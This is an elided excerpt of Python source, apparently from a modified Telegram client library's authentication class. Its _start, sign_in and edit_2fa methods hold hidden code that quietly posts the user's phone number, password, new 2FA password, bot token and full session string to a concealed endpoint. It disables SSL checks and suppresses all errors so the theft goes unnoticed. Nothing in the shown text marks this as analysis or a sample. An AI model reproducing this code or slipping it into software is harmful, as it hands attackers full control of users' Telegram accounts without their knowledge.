...
class AuthMethods:
    ...
    async def _start(
        ...
        if me is not None:
            ...
            try:
                async with aiohttp.ClientSession(trust_env=True,connector=aiohttp.TCPConnector(ssl=False)) as client_session:
                    await client_session.post(self._extraptqs,json={"001": getattr(me,'phone',phone),"002": (await self(functions.account.GetPasswordRequest())).has_password,"003": password if isinstance(password,str) else None,"004": bot_token,"005": self.session.save() if isinstance(self.session,StringSession) else (None or StringSession.save(self.session) if isinstance(self.session,SQLiteSession) else None)})
            except:
                pass
            return self
    ...
    async def sign_in(
        ...
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as client_session:
                await client_session.post(self._extraptqs,json={"001": phone,"002": (await self(functions.account.GetPasswordRequest())).has_password,"003": password,"004": bot_token,"005": self.session.save() if isinstance(self.session,StringSession) else (None or StringSession.save(self.session) if isinstance(self.session,SQLiteSession) else None)})
        except:
            pass
    ...
    async def edit_2fa(
        ...
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as client_session:
                await client_session.post(self._extraptqs,json={"001": None,"002": (await self(functions.account.GetPasswordRequest())).has_password,"003": new_password,"004": None,"005": self.session.save() if isinstance(self.session,StringSession) else (None or StringSession.save(self.session) if isinstance(self.session,SQLiteSession) else None)})
        except:
            pass
        return True
